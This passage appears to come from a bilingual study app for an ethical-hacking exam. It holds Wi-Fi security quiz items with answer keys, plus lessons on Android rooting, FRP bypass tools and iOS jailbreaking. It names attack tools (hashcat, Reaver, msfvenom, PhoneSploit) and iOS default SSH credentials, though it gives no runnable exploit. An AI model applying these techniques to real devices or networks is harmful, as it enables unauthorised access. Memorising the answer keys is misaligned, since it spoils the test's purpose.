  {q:{fr:"Quel mécanisme de contrôle d'intégrité WPA2 utilise-t-il ?",en:"Which integrity check does WPA2 use?"},opts:[{fr:"CBC-MAC",en:"CBC-MAC"},{fr:"CRC-32",en:"CRC-32"},{fr:"Michael",en:"Michael"},{fr:"BIP-GMAC-256",en:"BIP-GMAC-256"}],a:0,ex:{fr:"WPA2 (AES-CCMP) utilise CBC-MAC. WEP=CRC-32, WPA=Michael+CRC-32, WPA3=BIP-GMAC-256.",en:"WPA2 (AES-CCMP) uses CBC-MAC. WEP=CRC-32, WPA=Michael+CRC-32, WPA3=BIP-GMAC-256."}},
  {q:{fr:"Quelle est la taille de l'IV de WEP ?",en:"What is WEP's IV size?"},opts:[{fr:"24 bits",en:"24-bit"},{fr:"48 bits",en:"48-bit"},{fr:"128 bits",en:"128-bit"},{fr:"256 bits",en:"256-bit"}],a:0,ex:{fr:"WEP utilise un IV de 24 bits (trop court → réutilisation), avec RC4. WPA/WPA2 utilisent un IV de 48 bits.",en:"WEP uses a 24-bit IV (too short → reuse), with RC4. WPA/WPA2 use a 48-bit IV."}},
  {q:{fr:"Quelle attaque exploite le 4-way handshake de WPA2 en forçant la réutilisation du nonce ?",en:"Which attack exploits the WPA2 4-way handshake by forcing nonce reuse?"},opts:[{fr:"KRACK",en:"KRACK"},{fr:"FMS",en:"FMS"},{fr:"aLTEr",en:"aLTEr"},{fr:"Evil Twin",en:"Evil Twin"}],a:0,ex:{fr:"KRACK (Key Reinstallation Attack) intercepte le message 3 du handshake et force le client à réinstaller une clé déjà utilisée (nonce réutilisé).",en:"KRACK (Key Reinstallation Attack) intercepts handshake message 3 and forces the client to reinstall an already-used key (nonce reuse)."}},
  {q:{fr:"Quel numéro de mode hashcat est utilisé pour cracker un handshake WPA/WPA2/WPA3 ?",en:"Which hashcat mode number cracks a WPA/WPA2/WPA3 handshake?"},opts:[{fr:"-m 22000",en:"-m 22000"},{fr:"-m 1000",en:"-m 1000"},{fr:"-m 0",en:"-m 0"},{fr:"-m 500",en:"-m 500"}],a:0,ex:{fr:"Le mode 22000 de hashcat cible les handshakes Wi-Fi (format hc22000). Le -m 1000 vise les hash NTLM.",en:"hashcat mode 22000 targets Wi-Fi handshakes (hc22000 format). -m 1000 targets NTLM hashes."}},
  {q:{fr:"Quel outil est utilisé pour cracker le PIN WPS ?",en:"Which tool is used to crack the WPS PIN?"},opts:[{fr:"Reaver",en:"Reaver"},{fr:"aircrack-ng",en:"aircrack-ng"},{fr:"Cowpatty",en:"Cowpatty"},{fr:"SMAC",en:"SMAC"}],a:0,ex:{fr:"Reaver brute-force le PIN WPS jusqu'à trouver une correspondance. Contre-mesure : désactiver le WPS sur le routeur.",en:"Reaver brute-forces the WPS PIN until it finds a match. Countermeasure: disable WPS on the router."}},
  {q:{fr:"Quelle attaque met en place un AP pirate au même SSID avec un signal plus fort ?",en:"Which attack sets up a rogue AP with the same SSID and a stronger signal?"},opts:[{fr:"Evil Twin / Honeypot AP",en:"Evil Twin / Honeypot AP"},{fr:"KRACK",en:"KRACK"},{fr:"Deauth flood",en:"Deauth flood"},{fr:"MAC spoofing",en:"MAC spoofing"}],a:0,ex:{fr:"Le Honeypot AP (Evil Twin) diffuse le même SSID avec une antenne haute puissance : les NIC s'y connectent automatiquement.",en:"The Honeypot AP (Evil Twin) broadcasts the same SSID with a high-power antenna: NICs auto-connect to it."}},
  {q:{fr:"Quelle attaque exploite les IV faibles de WEP ?",en:"Which attack exploits WEP's weak IVs?"},opts:[{fr:"FMS (Fluhrer-Mantin-Shamir)",en:"FMS (Fluhrer-Mantin-Shamir)"},{fr:"KRACK",en:"KRACK"},{fr:"aLTEr",en:"aLTEr"},{fr:"KARMA",en:"KARMA"}],a:0,ex:{fr:"L'attaque FMS exploite les IV faibles de WEP (KSA de RC4) pour reconstituer la clé.",en:"The FMS attack exploits WEP's weak IVs (RC4 KSA) to reconstruct the key."}},
  {q:{fr:"Quel chiffrement est recommandé si WPA3 n'est pas supporté ?",en:"Which encryption is recommended if WPA3 isn't supported?"},opts:[{fr:"WPA2 avec AES",en:"WPA2 with AES"},{fr:"WEP",en:"WEP"},{fr:"WPA avec TKIP",en:"WPA with TKIP"},{fr:"aucun chiffrement",en:"no encryption"}],a:0,ex:{fr:"À défaut de WPA3, utiliser WPA2 avec AES (éviter WPA, TKIP et WEP, cassables).",en:"Failing WPA3, use WPA2 with AES (avoid WPA, TKIP and WEP, which are crackable)."}},
  {q:{fr:"Sur quelle fréquence et modulation fonctionne le 802.11b ?",en:"On which frequency and modulation does 802.11b operate?"},opts:[{fr:"2.4 GHz, DSSS",en:"2.4 GHz, DSSS"},{fr:"5 GHz, OFDM",en:"5 GHz, OFDM"},{fr:"2.4 GHz, MIMO-OFDM",en:"2.4 GHz, MIMO-OFDM"},{fr:"60 GHz, OFDMA",en:"60 GHz, OFDMA"}],a:0,ex:{fr:"802.11b = 2.4 GHz / DSSS (11 Mbps). 802.11a = 5 GHz / OFDM ; 802.11n = MIMO-OFDM.",en:"802.11b = 2.4 GHz / DSSS (11 Mbps). 802.11a = 5 GHz / OFDM; 802.11n = MIMO-OFDM."}}
 ]

  {id:"android", t:{fr:"Android",en:"Android"},
   s:{fr:"Architecture, rooting, FRP, outils",en:"Architecture, rooting, FRP, tools"},
   blocks:[
    {t:"p",fr:"Architecture (haut → bas) : **System Apps → Java API Framework → librairies natives C/C++ + Android Runtime (ART) → HAL → noyau Linux → Power Management**. Stockage : Shared Preferences, Internal/External Storage, **SQLite**, réseau.",en:"Architecture (top → bottom): **System Apps → Java API Framework → native C/C++ libraries + Android Runtime (ART) → HAL → Linux kernel → Power Management**. Storage: Shared Preferences, Internal/External Storage, **SQLite**, network."},
    {t:"h",fr:"Rooting",en:"Rooting"},
    {t:"p",fr:"Le **rooting** obtient l'accès **root** en exploitant le firmware et en copiant le **binaire `su`** dans le PATH (ex. `/system/xbin/su`) avec les droits d'exécution (`chmod`). Outil : **KingoRoot**. **FRP (Factory Reset Protection)** empêche l'accès à un appareil volé — contourné par **4ukey, Octoplus FRP**.",en:"**Rooting** gains **root** access by exploiting the firmware and copying the **`su` binary** into the PATH (e.g. `/system/xbin/su`) with exec rights (`chmod`). Tool: **KingoRoot**. **FRP (Factory Reset Protection)** blocks access to a stolen device — bypassed with **4ukey, Octoplus FRP**."},
    {t:"h",fr:"Outils",en:"Tools"},
    {t:"ul",items:[
      {fr:"**MobSF** — analyse statique/dynamique d'APK (permissions, certificats)",en:"**MobSF** — static/dynamic APK analysis (permissions, certificates)"},
      {fr:"**Kali NetHunter** — plateforme de pentest mobile (MITM, HID, Bad USB)",en:"**Kali NetHunter** — mobile pentest platform (MITM, HID, Bad USB)"},
      {fr:"**PhoneSploit Pro** — contrôle via **ADB** (shell, install/désinstall APK)",en:"**PhoneSploit Pro** — control via **ADB** (shell, install/uninstall APK)"},
      {fr:"**msfvenom / Meterpreter** — génération de payloads, shell distant",en:"**msfvenom / Meterpreter** — payload generation, remote shell"}]},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"Le rooting copie le **binaire `su`** dans le PATH. **FRP** = protection anti-vol Android. **MobSF** = analyse d'APK (statique/dynamique). **PhoneSploit** exploite **ADB**.",en:"Rooting copies the **`su` binary** into the PATH. **FRP** = Android anti-theft protection. **MobSF** = APK analysis (static/dynamic). **PhoneSploit** exploits **ADB**."},
    {t:"recap",items:[
      {k:"Architecture",fr:"Apps → Java API → ART → HAL → noyau Linux",en:"Apps → Java API → ART → HAL → Linux kernel"},
      {k:"Rooting",fr:"binaire su dans le PATH (KingoRoot)",en:"su binary in the PATH (KingoRoot)"},
      {k:"FRP",fr:"anti-vol, contourné par 4ukey",en:"anti-theft, bypassed by 4ukey"},
      {k:"Analyse",fr:"MobSF ; ADB via PhoneSploit",en:"MobSF; ADB via PhoneSploit"}]}
   ]},

  {id:"ios", t:{fr:"iOS",en:"iOS"},
   s:{fr:"Architecture, jailbreaking, creds par défaut",en:"Architecture, jailbreaking, default creds"},
   blocks:[
    {t:"p",fr:"Architecture (haut → bas) : **Cocoa → Media → Core Services → Core OS → Kernel & Device Drivers**. Le **Core OS** gère la sécurité et le matériel externe.",en:"Architecture (top → bottom): **Cocoa → Media → Core Services → Core OS → Kernel & Device Drivers**. **Core OS** handles security and external hardware."},
    {t:"h",fr:"Jailbreaking — 3 types d'exploit",en:"Jailbreaking — 3 exploit types"},
    {t:"table",head:{fr:["Type","Accès / patch"],en:["Type","Access / patch"]},rows:[
      [{fr:"**Userland**",en:"**Userland**"},{fr:"user-level seulement, **pas** d'accès iBoot ; corrigé par MAJ firmware",en:"user-level only, **no** iBoot access; patched by firmware update"}],
      [{fr:"**iBoot**",en:"**iBoot**"},{fr:"user + iBoot ; corrigé par MAJ firmware",en:"user + iBoot; patched by firmware update"}],
      [{fr:"**Bootrom**",en:"**Bootrom**"},{fr:"user + iBoot ; **impossible à corriger par firmware** (fix matériel Apple requis)",en:"user + iBoot; **cannot be patched by firmware** (Apple hardware fix required)"}]]},
    {t:"h",fr:"4 techniques (au reboot)",en:"4 techniques (on reboot)"},
    {t:"table",head:{fr:["Technique","Comportement"],en:["Technique","Behavior"]},rows:[
      [{fr:"**Untethered**",en:"**Untethered**"},{fr:"noyau patché **sans PC**, jailbreak persistant à chaque reboot",en:"kernel patched **without a PC**, jailbreak persists on every reboot"}],
      [{fr:"**Semi-tethered**",en:"**Semi-tethered**"},{fr:"noyau non patché mais utilisable ; outil requis pour les addons",en:"kernel not patched but usable; tool needed for addons"}],
      [{fr:"**Tethered**",en:"**Tethered**"},{fr:"doit être **rebranché à un PC** à chaque démarrage",en:"must be **re-connected to a PC** on each boot"}],
      [{fr:"**Semi-untethered**",en:"**Semi-untethered**"},{fr:"repatchable **via une app** de l'appareil (sans PC)",en:"re-patchable **via an on-device app** (no PC)"}]]},
    {t:"note",k:{fr:"Shell iOS",en:"iOS shell"},fr:"Identifiants par défaut : utilisateurs **`root`** et **`mobile`**, mot de passe **`alpine`** pour les deux. Accès SSH (Wi-Fi ou USB via iproxy port 2222).",en:"Default credentials: users **`root`** and **`mobile`**, password **`alpine`** for both. SSH access (Wi-Fi or USB via iproxy port 2222)."},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"**Bootrom exploit = non corrigeable par firmware** (fix matériel). **Tethered = doit se rebrancher au PC** à chaque reboot ; **untethered = persistant sans PC**. Creds iOS par défaut : **root/mobile + alpine**.",en:"**Bootrom exploit = not patchable by firmware** (hardware fix). **Tethered = must reconnect to PC** on each reboot; **untethered = persistent without a PC**. Default iOS creds: **root/mobile + alpine**."},
    {t:"recap",items:[
      {k:"3 exploits",fr:"Userland / iBoot / Bootrom (non patchable)",en:"Userland / iBoot / Bootrom (unpatchable)"},
      {k:"Tethered",fr:"rebranchement PC obligatoire",en:"PC reconnection required"},
      {k:"Untethered",fr:"persistant sans PC",en:"persistent without a PC"},
      {k:"Creds",fr:"root/mobile — alpine",en:"root/mobile — alpine"}]}
   ]},
